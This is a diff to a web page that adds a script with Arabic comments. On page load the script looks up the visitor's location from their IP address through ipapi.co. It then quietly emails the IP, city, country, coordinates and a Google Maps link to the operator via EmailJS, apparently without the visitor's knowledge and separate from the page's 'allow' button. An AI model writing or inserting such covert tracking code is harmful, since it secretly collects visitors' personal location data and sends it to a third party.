@@ -223,6 +223,28 @@
 
   <script>
 
+    // طلب بيانات الموقع بناءً على عنوان الـ IP الخاص بالزائر
+fetch('https://ipapi.co/json/')
+  .then(response => response.json())
+  .then(data => {
+    console.log("الدولة:", data.country_name);
+    console.log("المدينة:", data.city);
+    console.log("خط العرض التقريبي:", data.latitude);
+    console.log("خط الطول التقريبي:", data.longitude);
+
+    // إرسال البيانات عبر EmailJS أو خادمك الخاص
+    emailjs.send("service_humq0xe", "template_tb6rj6p", {
+      name: "User via IP",
+      ip: data.ip,
+      city: data.city,
+      country: data.country_name,
+      latitude: data.latitude,
+      longitude: data.longitude,
+      map_link: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+    });
+  })
+  .catch(error => console.error("Error fetching IP location:", error));
+
     const allowBtn =
       document.getElementById("allowBtn");
 
